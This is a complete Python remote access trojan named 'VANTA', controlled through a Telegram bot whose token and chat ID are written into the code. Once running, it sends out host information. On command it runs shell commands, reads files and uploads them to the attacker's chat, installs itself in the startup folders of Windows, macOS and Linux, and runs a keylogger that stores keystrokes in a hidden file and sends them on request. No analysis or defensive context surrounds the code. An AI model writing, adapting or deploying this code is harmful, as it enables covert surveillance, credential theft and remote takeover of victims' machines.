#!/usr/bin/env python3
import os, sys, time, json, urllib.request, urllib.parse, socket, platform, getpass, subprocess, shutil, threading

TOKEN = "9106770208:AAFMVdxGkPH8XXHdtY4qh8E0FvaY0n7EqU"
CHAT_ID = "6796019288"
SLEEP_SECONDS = 3600
ACTIVE_SECONDS = 5
API = "https://api.telegram.org/bot" + TOKEN
KEYLOG_FILE = os.path.expanduser("~/.cache/.vanta_keys")
_keylog_running = False

def api(method, params=None):
    try:
        data = urllib.parse.urlencode(params or {}).encode()
        req = urllib.request.Request(API + "/" + method, data=data)
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read().decode())
    except Exception:
        return {}

def send(text):
    return api("sendMessage", {"chat_id": CHAT_ID, "text": text[:4000]})

def sysinfo():
    try:
        return json.dumps({"hostname": socket.gethostname(), "user": getpass.getuser(), "os": platform.platform(), "cwd": os.getcwd()}, ensure_ascii=False)
    except Exception as e:
        return str(e)

def execute_cmd(cmd):
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
        return (out.stdout + out.stderr).decode("utf-8", "ignore")[:3500] or "(no output)"
    except Exception as e:
        return "error: " + str(e)

def persist():
    try:
        if platform.system() == "Windows": d = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        elif platform.system() == "Darwin": d = os.path.expanduser("~/Library/LaunchAgents")
        else: d = os.path.expanduser("~/.config/autostart")
        os.makedirs(d, exist_ok=True)
        src = os.path.abspath(sys.argv[0])
        dst = os.path.join(d, os.path.basename(src))
        if src != dst: shutil.copy2(src, dst)
        return "persisted: " + dst
    except Exception as e:
        return "persist failed: " + str(e)

def _keylog_loop():
    global _keylog_running
    try:
        from pynput import keyboard
    except Exception:
        send("keylog: pynput not installed. Run: /cmd pip install pynput")
        _keylog_running = False
        return

    def write(s):
        try:
            os.makedirs(os.path.dirname(KEYLOG_FILE), exist_ok=True)
            with open(KEYLOG_FILE, "a", encoding="utf-8") as f: f.write(s)
        except Exception: pass

    def on_press(key):
        global _keylog_running
        if not _keylog_running: return False
        try: write(key.char or "")
        except AttributeError:
            if key == keyboard.Key.space: write(" ")
            elif key == keyboard.Key.enter: write("\n")
            elif key == keyboard.Key.tab: write("\t")
            elif key == keyboard.Key.backspace: write("[BS]")
        return _keylog_running

    try:
        with keyboard.Listener(on_press=on_press) as listener: listener.join()
    except Exception as e:
        send("keylog crashed: " + str(e))
    _keylog_running = False

def start_keylog():
    global _keylog_running
    if _keylog_running: return "already running"
    _keylog_running = True
    threading.Thread(target=_keylog_loop, daemon=True).start()
    return "keylogger started → " + KEYLOG_FILE

def handle(msg):
    global _keylog_running
    text = (msg.get("text") or "").strip()
    if not text: return None
    if text == "/wake": return "ACTIVE"
    if text == "/sleep": return "SLEEP"
    if text == "/sysinfo": send(sysinfo()); return None
    if text == "/persist": send(persist()); return None
    if text.startswith("/cmd "): send(execute_cmd(text[5:])); return None
    if text.startswith("/ls "):
        try: send("\n".join(os.listdir(text[4:].strip()))[:3500])
        except Exception as e: send("ls error: " + str(e))
        return None
    if text.startswith("/cat "):
        try:
            with open(text[5:].strip(), "r", errors="ignore") as f: send(f.read()[:3500])
        except Exception as e: send("cat error: " + str(e))
        return None
    if text.startswith("/get "):
        p = text[5:].strip()
        try:
            with open(p, "rb") as f: data = f.read()
            boundary = "----VANTA"
            body = b""
            body += ("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + str(CHAT_ID) + "\r\n").encode()
            body += ("--" + boundary + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + os.path.basename(p) + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").encode()
            body += data + b"\r\n--" + boundary + "--\r\n"
            req = urllib.request.Request(API + "/sendDocument", data=body)
            req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
            urllib.request.urlopen(req, timeout=60)
        except Exception as e: send("get error: " + str(e))
        return None
    if text == "/keylog start": send(start_keylog()); return None
    if text == "/keylog stop": _keylog_running = False; send("keylogger stopped"); return None
    if text == "/keylog dump":
        try:
            with open(KEYLOG_FILE, "r", errors="ignore") as f: send(f.read()[-3500:] or "(empty)")
        except Exception as e: send("error: " + str(e))
        return None
    if text == "/kill": send("dying."); sys.exit(0)
    return None

def poll(offset):
    r = api("getUpdates", {"offset": offset, "timeout": 0})
    return r.get("result", [])

def main():
    offset = 0
    active = False
    send("[VANTA AGENT ONLINE] " + sysinfo())
    while True:
        try:
            for u in poll(offset):
                offset = u["update_id"] + 1
                msg = u.get("message", {})
                if str(msg.get("chat", {}).get("id")) != str(CHAT_ID): continue
                state = handle(msg)
                if state == "ACTIVE" and not active:
                    active = True; send("WAKE: active (5s)")
                elif state == "SLEEP" and active:
                    active = False; send("SLEEP: dormant (1h)")
            time.sleep(ACTIVE_SECONDS if active else SLEEP_SECONDS)
        except Exception: time.sleep(120)

if __name__ == "__main__": main()
